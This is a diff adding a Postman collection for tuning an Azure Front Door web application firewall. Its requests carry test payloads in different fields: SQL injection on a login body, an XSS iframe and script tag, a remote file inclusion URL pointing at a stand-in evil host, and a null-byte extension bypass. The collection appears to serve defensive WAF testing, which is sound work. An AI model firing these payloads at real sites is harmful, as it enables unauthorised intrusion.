@@ -1,0 +1,179 @@
+{
+	"info": {
+		"_postman_id": "acb2c657-4202-4ee4-a9c0-7f9072798941",
+		"name": "Azure WAF Tuning - Front Door",
+		"schema": "https://schema.getpostman.com/json/collection/v2.1.0/collection.json",
+		"_exporter_id": "9790016"
+	},
+	"item": [
+		{
+			"name": "Request Body JSON Args Name (JSON entity)",
+			"event": [
+				{
+					"listen": "prerequest",
+					"script": {
+						"exec": [
+							""
+						],
+						"type": "text/javascript"
+					}
+				}
+			],
+			"request": {
+				"auth": {
+					"type": "noauth"
+				},
+				"method": "POST",
+				"header": [],
+				"body": {
+					"mode": "raw",
+					"raw": "{\r\n    \"properties\": {\r\n        \"credentials\": {\r\n            \"email\": \"admin\",\r\n            \"password\": \"' or 1=1--\"\r\n        }\r\n    }\r\n}",
+					"options": {
+						"raw": {
+							"language": "json"
+						}
+					}
+				},
+				"url": {
+					"raw": "http://{{domain}}/rest/user/login",
+					"protocol": "http",
+					"host": [
+						"{{domain}}"
+					],
+					"path": [
+						"rest",
+						"user",
+						"login"
+					]
+				}
+			},
+			"response": []
+		},
+		{
+			"name": "Request Body Post Args Name (Form-Data)",
+			"request": {
+				"method": "POST",
+				"header": [],
+				"body": {
+					"mode": "formdata",
+					"formdata": [
+						{
+							"key": "captcha",
+							"value": "98",
+							"type": "text"
+						},
+						{
+							"key": "captchaId",
+							"value": "0",
+							"type": "text"
+						},
+						{
+							"key": "comment",
+							"value": "<iframe src=\"x-javascript&colon;alert(`xss`)\">",
+							"type": "text"
+						},
+						{
+							"key": "rating",
+							"value": "3",
+							"type": "text"
+						}
+					]
+				},
+				"url": {
+					"raw": "http://{{domain}}/contact",
+					"protocol": "http",
+					"host": [
+						"{{domain}}"
+					],
+					"path": [
+						"contact"
+					]
+				}
+			},
+			"response": []
+		},
+		{
+			"name": "Query String Args Name (URL query string)",
+			"request": {
+				"method": "GET",
+				"header": [],
+				"url": {
+					"raw": "http://{{domain}}/about?page=http://evilsite.com/evilcode.php",
+					"protocol": "http",
+					"host": [
+						"{{domain}}"
+					],
+					"path": [
+						"about"
+					],
+					"query": [
+						{
+							"key": "page",
+							"value": "http://evilsite.com/evilcode.php"
+						}
+					]
+				}
+			},
+			"response": []
+		},
+		{
+			"name": "Request Header Name",
+			"request": {
+				"method": "GET",
+				"header": [
+					{
+						"key": "User-Agent",
+						"value": "<script>alert(1)</script>",
+						"type": "text"
+					}
+				],
+				"url": {
+					"raw": "http://{{domain}}/rest/memories/?file=secret.doc%00.pdf",
+					"protocol": "http",
+					"host": [
+						"{{domain}}"
+					],
+					"path": [
+						"rest",
+						"memories",
+						""
+					],
+					"query": [
+						{
+							"key": "file",
+							"value": "secret.doc%00.pdf"
+						}
+					]
+				}
+			},
+			"response": []
+		}
+	],
+	"event": [
+		{
+			"listen": "prerequest",
+			"script": {
+				"type": "text/javascript",
+				"exec": [
+					""
+				]
+			}
+		},
+		{
+			"listen": "test",
+			"script": {
+				"type": "text/javascript",
+				"exec": [
+					""
+				]
+			}
+		}
+	],
+	"variable": [
+		{
+			"key": "domain",
+			"value": "",
+			"type": "string"
+		}
+	]
+}
